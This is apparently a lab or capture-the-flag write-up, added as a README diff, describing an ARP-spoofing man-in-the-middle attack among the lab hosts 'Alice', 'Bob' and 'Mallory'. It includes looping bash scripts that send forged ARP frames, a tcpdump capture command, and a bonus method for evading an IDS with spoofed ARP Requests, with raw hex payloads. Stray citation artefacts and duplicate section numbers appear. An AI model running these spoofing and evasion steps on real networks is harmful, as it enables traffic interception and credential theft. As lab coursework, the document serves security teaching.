@@ -1,1 +1,99 @@
-# mitm
+## 1. Introduction
+The objective of this lab was to perform a Man-in-the-Middle (MITM) attack within a switched Ethernet network. Acting as the attacker "Mallory," the goal was to intercept traffic between two other nodes, "Alice" and "Bob," to steal a secret flag. This was achieved using **ARP Spoofing** (also known as ARP Cache Poisoning).
+
+## 2. Network Reconnaissance
+The first step was to identify the targets on the local network (interface `eth1`).
+* **Method:** I used `ifconfig` to identify my own details and `ping` sweeps combined with `arp` cache inspection to identify Alice and Bob.
+* **Findings:**
+
+| Role | IP Address | MAC Address (Hardware) |
+| :--- | :--- | :--- |
+| **Mallory (Attacker)** | `10.10.49.4` | `02:42:0a:0a:31:04` |
+| **Alice (Victim)** | `10.10.49.2` | `02:42:0a:0a:31:02` |
+| **Bob (Target)** | `10.10.49.3` | `02:42:0a:0a:31:03` |
+
+## 3. Attack Strategy: ARP Spoofing
+To become the "Man in the Middle," I needed to poison the ARP cache of both victims.
+1.  **Poisoning Alice:** I sent a forged ARP Reply telling Alice that **Bob's IP** is at **Mallory's MAC**.
+2.  **Poisoning Bob:** I sent a forged ARP Reply telling Bob that **Alice's IP** is at **Mallory's MAC**.
+
+### 3.1 Payload Construction
+Using the provided `raw_packet` tool and `hexedit`, I constructed two binary payload files containing the raw hex bytes for the spoofed Ethernet/ARP frames.
+
+**Payload 1: `spoof_alice` (Trick Alice)**
+* **Sender MAC:** `02:42:0a:0a:31:04` (Mallory - The Trap)
+* **Sender IP:** `10.10.49.3` (Bob - The Lie)
+* **Target:** Alice
+
+**Payload 2: `spoof_bob` (Trick Bob)**
+* **Sender MAC:** `02:42:0a:0a:31:04` (Mallory - The Trap)
+* **Sender IP:** `10.10.49.2` (Alice - The Lie)
+* **Target:** Bob
+
+## 4. Execution
+Because ARP cache entries expire quickly (often within seconds), a single packet is insufficient. I created a Bash script to continuously send these spoofed packets.
+
+**Script: `mitm.sh`**
+```bash
+#!/bin/bash
+echo "Starting MITM Attack..."
+while true; do
+    # Tell Alice I am Bob
+    sudo ./raw_packet eth1 02:42:0a:0a:31:02 0x0806 spoof_alice
+    # Tell Bob I am Alice
+    sudo ./raw_packet eth1 02:42:0a:0a:31:03 0x0806 spoof_bob
+    sleep 2
+done
+```
+
+Traffic Interception: With the script running in the background, I used tcpdump to listen to the traffic passing through my interface.
+
+```bash
+sudo tcpdump -i eth1 -A | grep "CTF"
+```
+5. Results
+The attack was successful. I intercepted the communication from Alice intended for Bob and captured the secret flag.
+
+Captured Secret:
+
+CTF{secret-fSkqpILT51TM3B6OQZ9x}
+
+## 4. Bonus Task: Evading Intrusion Detection
+The lab scenario introduced a hypothetical Intrusion Detection System (IDS) capable of flagging suspicious ARP Replies (specifically Gratuitous ARP packets). [cite_start]The objective was to maintain the Man-in-the-Middle position while bypassing this detection mechanism [cite: 95-97].
+
+### 4.1 Strategy: Request-Based Spoofing
+Standard IDSs often filter unsolicited ARP Replies because they are a common signature of spoofing attacks. [cite_start]However, the ARP protocol dictates that when a device receives an **ARP Request** (Opcode `0x0001`), it must update its cache with the Sender's IP and MAC address to facilitate a reply[cite: 100].
+
+By framing the spoofed packets as "questions" (Requests) rather than "answers" (Replies), the attack mimics legitimate network resolution traffic (e.g., "Who has Alice?"), forcing the victims to update their ARP tables without triggering the IDS rule against gratuitous replies.
+
+### 4.2 Implementation
+I modified the attack to use ARP Requests by changing the **Opcode** field in the raw Ethernet frames.
+
+**Payload Modifications:**
+I created two new binary payloads, `stealth_alice` and `stealth_bob`, using `hexedit`. The only difference from the previous payloads was the 8th byte (Opcode):
+* **Original Opcode:** `00 02` (ARP Reply)
+* **New Opcode:** `00 01` (ARP Request)
+
+**Hex Structure Example (Alice Payload):**
+`00 01 08 00 06 04 00 01 02 42 0A 0A 31 04 ...`
+*(The opcode at offset 0x06-0x07 is set to `00 01`)*.
+1. stealth_alice (Trick Alice) This packet acts as a Request from "Bob" (Mallory's MAC) asking "Who has Alice?"
+
+Hex Sequence: 00 01 08 00 06 04 00 01 02 42 0A 0A 31 04 0A 0A 31 03 02 42 0A 0A 31 02 0A 0A 31 02
+
+2. stealth_bob (Trick Bob) This packet acts as a Request from "Alice" (Mallory's MAC) asking "Who has Bob?"
+
+Hex Sequence: 00 01 08 00 06 04 00 01 02 42 0A 0A 31 04 0A 0A 31 02 02 42 0A 0A 31 03 0A 0A 31 03
+**Execution Script (`bonus_attack.sh`):**
+A modified Bash script was used to broadcast these requests continuously:
+```bash
+#!/bin/bash
+while true; do
+    # Opcode 1 (Request) packets
+    sudo ./raw_packet eth1 02:42:0a:0a:31:02 0x0806 stealth_alice
+    sudo ./raw_packet eth1 02:42:0a:0a:31:03 0x0806 stealth_bob
+    sleep 2
+done
+```
+4.3 Results & Mitigation
+Result: The modified attack successfully poisoned the targets' ARP caches without triggering the hypothetical IDS. I verified this by capturing the traffic again using tcpdump and successfully retrieving the flag: CTF{secret-fSkqpILT51TM3B6OQZ9x}.
